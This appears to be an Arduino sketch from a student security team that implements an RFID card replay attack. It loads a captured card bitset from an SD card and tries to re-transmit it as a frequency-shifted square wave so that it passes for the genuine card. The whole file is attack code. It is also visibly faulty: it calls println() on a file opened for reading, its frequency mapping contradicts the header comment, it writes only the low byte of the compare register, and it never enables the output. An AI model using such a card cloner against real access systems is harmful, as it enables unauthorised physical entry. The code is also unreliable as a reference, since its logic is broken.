/*  Team Breach Prototype Testing 
  Connor Grehlinger, Keith Doggett, Mathew Schlogel, John Oribioye, Matt Leung
  --------------------------------------------------------------
  Source code for replay attack
  
  -Data bitset from RFID card is read from test.txt file on SD card
  -Arduino encodes an output signal based on bitset
  -Square wave signal of varying frequency (0 --> 15.6kHz, 1 --> 12.5kHz)
  -Loops through data array from RFID capture, mimicking actual card transmission 
  
*/
 
// Include IO and interrupt libraries
#include <avr/io.h >
// ISR interrupt service routine
#include <avr/interrupt.h >
// Include SD card libraries 
#include <SPI.h>
#include <SD.h>

File timingValues;          // SD card file for data storage

#define INPUT_PIN 4         // Will be used to output collected pulse times
#define EX_INT_PIN 2        // INTO uses pin 2, external interrupt
                            // This is port D2
    
#define LED_PIN 13

volatile unsigned int periodLength;
volatile unsigned int periodLengths[144];

volatile unsigned int firstRisingEdgeTime;
volatile unsigned int secondRisingEdgeTime;
volatile char state = 0;

unsigned int index = 0;
char lock = 0;

const int ocr1aPin = 9;   // Output of output comparator 1

// Function for setting the frequency of the replay signal
// Parameter passed in will be 15
void setFrequency(uint32_t freq)
{
  uint32_t requiredDivisor = (F_CPU/2)/(uint32_t)freq;
  uint16_t prescalerVal;
  uint8_t prescalerBits;
  if (requiredDivisor < 65536UL)
  {
    prescalerVal = 1;
    prescalerBits = 1;
  }
  else if (requiredDivisor < 8 * 65536UL)
  {
    prescalerVal = 8;
    prescalerBits = 2;
  }
  else if (requiredDivisor < 64 * 65536UL)
  {
    prescalerVal = 64;
    prescalerBits = 3;
  }
  else if (requiredDivisor < 256 * 65536UL)
  {
    prescalerVal = 256;
    prescalerBits = 4;
  }
  else
  {
    prescalerVal = 1024;
    prescalerBits = 5;
  }

  uint16_t top = ((requiredDivisor + (prescalerVal/2))/prescalerVal) - 1;
  TCCR1A = 0;
  TCCR1B = (1 << WGM12) | prescalerBits;
  TCCR1C = 0;
  OCR1A = (top & 0xFF);
}


// Turn on the frequency (reset and enable)
void on()
{
  // TCNT is the timer/counter register
  // -This resets the register value and must be done by writing 
  // -the high byte first then the low byte 
  
  TCNT1H = 0;   // Write the high byte first
  TCNT1L = 0;   // Write the low byte next
  
  // -The high byte value is first placed in temp register,
  // -once low byte is written the value is moved to the actual register

  // TCCR is the timer/counter control register
  // -This determines how the compare output pin is connected to timer 1
  TCCR1A |= (1 << COM1A0);  // COM1AO = 1;
  // -Setting COM1A0 (compare output mode bit 0) to 1 indicates
  // that OC1 (output comparator) will be toggled on compare match
}


// Turn off the frequency by inverting control bit
void off()
{
  // TCCR timer/counter control register
  // -Sets COM1A0 to 0 which disconnects OC1 from timer/counter 1
  TCCR1A &= ~(1 << COM1A0);
}


void setup() {
    Serial.begin(115200);
    
    while(!Serial);

    Serial.print("Initializing SD card...");

    if (!SD.begin(4)) {
      Serial.println("initialization failed!");
      return;
     }
    Serial.println("Initialization done.");

    
    /*
    timingValues = SD.open("test.txt", FILE_READ);
    
    if (timingValues) {
      Serial.println("File opened correcrly: test.txt");
      timingValues.close();
    } else {
      Serial.println("Error opening test.txt");
    }
    */
    
    Serial.println("Trigger pin 4 for replay data bitset...");
    
    pinMode(EX_INT_PIN, INPUT);                         // set external interrupt as input
    pinMode(INPUT_PIN, INPUT);
    pinMode(LED_PIN, OUTPUT);
    
    /*
    GICR |= (1 << INTO);                                // Enable INTO interrupt on general interrupt control register
    
    MCUCR |= (1 << ISC00);                              // MCU control register
    MCUCR |= (0 << ISC01);                              // 1 << ISC00 and 1 << ISC01 = rising edge, 0 << ISC00 and 1 << ISC01 = falling edge, 
                                                        // 1 << ISC00 and 0 << ISC01 = both rising and falling edges  
    */

    digitalWrite(ocr1aPin, LOW);
    pinMode(ocr1aPin, OUTPUT);
    
    PORTD &= B11101111;                                 // Set LED to LOW

    setFrequency(12500);
    off();
   
}


void loop() {
  
    if(PIND & (1 << PD4) && !lock)
    {
        lock = 1;
        delay(2000);
        PORTB |= B00100000;         // LED to HIGH
        
        // Re-open for reading 
        timingValues = SD.open("test.txt", FILE_READ);
        
        if (timingValues) {
          Serial.println("Re-opening for read, test.txt file contents:");

          // read from the file until there's nothing else in it:
          int i = 0;
          while (timingValues.available()) {
              
              //periodLengths[i] = (volatile unsigned int)timingValues.read();
              periodLengths[i] = (volatile unsigned int)timingValues.println();
              //Serial.write(timingValues.read());
              i++;
          }
          timingValues.close();
        } else {
          Serial.println("Error opening test.txt");
        }
        delay(3000);
        Serial.println("Now displaying values from newly populated on-board array:");
        for (int i = 0; i < 144; i++)
        {
          Serial.println(periodLengths[i]);
          if (periodLengths[i] == 0)
          {
            setFrequency(12500);
          }
          else if(periodLengths[i] == 1)
          {
            setFrequency(15600);
          }
          else 
          {
            //errror has occurred 
          }
        }
        lock = 0;
    }
}
